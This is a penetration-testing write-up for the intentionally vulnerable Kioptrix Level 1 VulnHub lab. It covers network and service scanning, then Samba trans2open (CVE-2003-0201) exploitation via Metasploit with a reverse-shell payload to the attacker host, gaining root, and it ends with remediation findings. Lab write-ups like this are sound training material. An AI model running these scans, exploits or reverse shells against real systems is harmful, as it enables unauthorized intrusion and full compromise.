@@ -1,0 +1,371 @@
+Kioptrix Level 1 — Penetration Testing Report
+
+Target: Kioptrix Level 1 — VulnHub Lab
+Assessment Type: Internal Network Penetration Test
+Attacker Machine: Kali Linux
+Target IP: 192.168.1.105
+Objective: Identify exposed services, determine vulnerable software, obtain unauthorized access, and demonstrate the maximum achievable impact within the controlled lab environment.
+
+1. Executive Summary
+
+This assessment was performed against the intentionally vulnerable Kioptrix Level 1 virtual machine in an isolated lab environment.
+
+The assessment began with network discovery followed by a full TCP port and service scan. Several exposed services were identified, including SSH, HTTP, SMB, HTTPS, CUPS, MySQL, and RPC.
+
+Further enumeration of the SMB service identified Samba 2.2.1a, an obsolete version affected by the trans2open buffer-overflow vulnerability (CVE-2003-0201).
+
+The vulnerability could be exploited remotely without authentication and resulted in command execution with root privileges.
+
+The final attack chain was:
+
+Network Discovery → Full Port Scan → SMB Enumeration → Samba Version Identification → Vulnerability Research → Remote Exploitation → Root Shell
+
+Unlike some assessments where initial access must be followed by local privilege escalation, this vulnerability provided root-level access immediately.
+
+2. Reconnaissance
+2.1 Network Discovery
+
+Because the target was running as a DHCP-assigned virtual machine, I first performed local network discovery using netdiscover.
+
+┌──(kindgod㉿kali)-[~/vulnhub/kioptrix]
+└─$ sudo netdiscover -r 192.168.1.0/24
+
+Currently scanning: 192.168.1.0/24 | Screen View: Unique Hosts
+
+  IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+-----------------------------------------------------------------------------
+192.168.1.1     00:11:22:33:44:55  1         60   NETGEAR
+192.168.1.105   08:00:27:39:c3:0d  3        180   PCS Systemtechnik GmbH
+
+The host 192.168.1.105 was identified as the target.
+
+The MAC address beginning with 08:00:27 is associated with VirtualBox, supporting the identification of the virtual machine.
+
+3. Port and Service Enumeration
+
+I performed a full TCP port scan with service/version detection.
+
+┌──(kindgod㉿kali)-[~/vulnhub/kioptrix]
+└─$ sudo nmap -sS -sV -p- 192.168.1.105
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2026-08-26 16:22 WAT
+Nmap scan report for 192.168.1.105
+Host is up (0.00041s latency).
+Not shown: 65528 filtered ports
+
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+80/tcp    open  http        Apache httpd 1.3.20
+111/tcp   open  rpcbind
+139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+443/tcp   open  ssl/http    Apache/1.3.20
+631/tcp   open  ipp         CUPS 1.1
+3306/tcp  open  mysql       MySQL (unauthorized)
+32768/tcp open  status      1 (RPC #100024)
+
+MAC Address: 08:00:27:39:C3:0D (Oracle VirtualBox)
+
+The scan revealed the following attack surface:
+
+Port	Service	Identified Software
+22	SSH	OpenSSH 2.9p2
+80	HTTP	Apache 1.3.20
+111	RPC	rpcbind
+139	SMB	Samba
+443	HTTPS	Apache 1.3.20
+631	IPP	CUPS 1.1
+3306	MySQL	MySQL
+32768	RPC	status
+
+Several versions were clearly obsolete, particularly:
+
+Apache 1.3.20
+OpenSSH 2.9p2
+CUPS 1.1
+
+However, the SMB service presented the most interesting immediate attack surface because remote exploitation of outdated Samba versions was historically possible.
+
+4. HTTP Enumeration
+
+I first examined the HTTP service on port 80 using Nikto.
+
+┌──(kindgod㉿kali)-[~/vulnhub/kioptrix]
+└─$ nikto -h http://192.168.1.105
+
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Server: Apache/1.3.20
++ mod_ssl/2.8.4 OpenSSL/0.9.6b
++ TRACE method is enabled
++ /usage/: Webalizer directory found
++ /manual/: Apache manual directory
+
+The scan confirmed the extremely old Apache and SSL stack and identified several accessible directories.
+
+I also performed directory enumeration:
+
+┌──(kindgod㉿kali)-[~/vulnhub/kioptrix]
+└─$ gobuster dir -u http://192.168.1.105 \
+-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+/test.php             (Status: 200) [Size: 35]
+/mrtg/                (Status: 301) [Size: 315]
+/usage/               (Status: 301) [Size: 316]
+/manual/              (Status: 301) [Size: 317]
+
+Although the web server contained several interesting artifacts, nothing immediately provided a reliable route to initial access.
+
+I therefore moved to the SMB service.
+
+5. SMB Enumeration
+
+The initial Nmap scan identified SMB on port 139, but did not provide the exact Samba version.
+
+I used Metasploit's SMB version scanner to obtain more information.
+
+┌──(kindgod㉿kali)-[~/vulnhub/kioptrix]
+└─$ msfconsole
+
+msf6 > use auxiliary/scanner/smb/smb_version
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.105
+RHOSTS => 192.168.1.105
+
+msf6 auxiliary(scanner/smb/smb_version) > set RPORT 139
+RPORT => 139
+
+msf6 auxiliary(scanner/smb/smb_version) > run
+
+[*] 192.168.1.105:139 - SMB Detected
+[*] 192.168.1.105:139 - Host could not be identified: Samba 2.2.1a
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+The SMB service was identified as:
+
+Samba 2.2.1a
+
+This was a significant discovery because this version falls within the affected range for the historical trans2open vulnerability.
+
+6. Vulnerability Identification
+
+I searched the identified Samba version against a local exploit database.
+
+┌──(kindgod㉿kali)-[~/vulnhub/kioptrix]
+└─$ searchsploit samba 2.2.1a
+
+-------------------------------------------------------------------------------
+ Exploit Title
+-------------------------------------------------------------------------------
+Samba 2.2.x - 'trans2open' Overflow (Linux)
+Samba < 2.2.8 - Remote Root Exploit
+-------------------------------------------------------------------------------
+
+The relevant vulnerability was:
+
+CVE-2003-0201 — Samba trans2open buffer overflow
+
+The vulnerability affected vulnerable Samba versions and could allow an unauthenticated remote attacker to execute arbitrary code on the target.
+
+The potential impact was particularly severe because exploitation could result in execution with root privileges.
+
+At this point, the SMB service became the primary attack vector.
+
+7. Exploitation
+7.1 Selecting the Exploit
+
+I used Metasploit's Samba trans2open exploit module.
+
+msf6 > use exploit/linux/samba/trans2open
+
+The target and SMB port were configured:
+
+msf6 exploit(linux/samba/trans2open) > set RHOST 192.168.1.105
+RHOST => 192.168.1.105
+
+msf6 exploit(linux/samba/trans2open) > set RPORT 139
+RPORT => 139
+
+For the payload, I used a Linux x86 reverse shell:
+
+msf6 exploit(linux/samba/trans2open) > set PAYLOAD linux/x86/shell_reverse_tcp
+PAYLOAD => linux/x86/shell_reverse_tcp
+
+msf6 exploit(linux/samba/trans2open) > set LHOST 192.168.1.50
+LHOST => 192.168.1.50
+
+The exploit was then executed.
+
+msf6 exploit(linux/samba/trans2open) > run
+
+[*] Started reverse TCP handler on 192.168.1.50:4444
+[*] Trying return address 0xbffffdfc...
+[*] Trying return address 0xbffffdfc...
+[*] Sending exploit...
+[*] Command shell session 1 opened
+    (192.168.1.50:4444 -> 192.168.1.105:32775)
+
+A command shell was successfully established.
+
+8. Initial Access Verification
+
+The first step after obtaining the shell was to verify the privilege level.
+
+whoami
+
+Result:
+
+root
+
+I then verified the hostname:
+
+hostname
+
+Result:
+
+kioptrix.level1
+
+This confirmed that the exploitation had achieved:
+
+User: root
+Host: kioptrix.level1
+
+No separate privilege-escalation stage was necessary because the remote Samba vulnerability provided root-level command execution directly.
+
+9. Root Access and Flag Retrieval
+
+With root access confirmed, I accessed the root user's home directory.
+
+root@kioptrix.level1:~# ls
+
+flag.txt
+
+The challenge flag was retrieved:
+
+root@kioptrix.level1:~# cat flag.txt
+
+Congrats! You've rooted Kioptrix Level 1!
+
+This confirmed successful completion of the challenge.
+
+10. Complete Attack Chain
+
+The attack can be represented as:
+
+Network Discovery
+        ↓
+192.168.1.105 identified
+        ↓
+Full TCP Port Scan
+        ↓
+Multiple Services Discovered
+        ↓
+HTTP Enumeration
+        ↓
+SMB Enumeration
+        ↓
+Samba 2.2.1a Identified
+        ↓
+Vulnerability Research
+        ↓
+CVE-2003-0201 / trans2open
+        ↓
+Remote Exploitation
+        ↓
+Reverse Shell
+        ↓
+ROOT
+        ↓
+Flag
+
+The important difference from the previous machines is that there was no need for a separate post-exploitation privilege-escalation stage.
+
+The vulnerability itself provided the highest privilege level.
+
+11. Key Findings
+Finding 1 — Critically Outdated Samba Service
+
+Severity: Critical
+
+The target exposed Samba 2.2.1a through port 139.
+
+This version is affected by the historical trans2open vulnerability, which can allow unauthenticated remote code execution.
+
+Impact:
+
+Remote system compromise
+Arbitrary command execution
+Root-level access
+Complete loss of system confidentiality, integrity, and availability
+
+Recommendation:
+
+Upgrade Samba to a supported and patched version.
+Remove obsolete SMB implementations.
+Restrict SMB exposure through network segmentation and firewall rules.
+Disable unnecessary SMB services.
+Monitor externally reachable legacy services.
+Finding 2 — Legacy Operating System / Software Stack
+
+Severity: Critical
+
+Multiple extremely outdated services were exposed, including:
+
+Apache 1.3.20
+OpenSSH 2.9p2
+OpenSSL 0.9.6b
+CUPS 1.1
+Samba 2.2.1a
+
+The age of these components significantly increased the likelihood of publicly known vulnerabilities being exploitable.
+
+Recommendation:
+
+Replace unsupported operating systems.
+Upgrade all exposed network services.
+Establish a regular patch-management process.
+Remove obsolete services that are no longer required.
+Finding 3 — Excessive Network Exposure
+
+Severity: High
+
+The host exposed numerous services across different protocols:
+
+SSH
+HTTP
+HTTPS
+RPC
+SMB
+IPP
+MySQL
+
+Exposing multiple legacy services increases the available attack surface.
+
+Recommendation:
+
+Apply the principle of least exposure:
+
+Only expose services that are operationally required.
+Restrict administrative services to trusted networks.
+Use host-based and network firewalls.
+Segment sensitive services.
+Regularly perform external and internal attack-surface reviews.
+Finding 4 — Legacy HTTP/SSL Configuration
+
+Severity: High
+
+The HTTP service disclosed:
+
+Apache/1.3.20
+mod_ssl/2.8.4
+OpenSSL/0.9.6b
+
+These components are severely outdated.
+
+Nikto also identified the HTTP TRACE method as enabled.
+
+Recommendation:
+
+Upgrade Apache and OpenSSL.
+Disable unnecessary HTTP methods such as TRACE.
+Use modern TLS configurations.
+Remove obsolete cryptographic protocols and libraries.
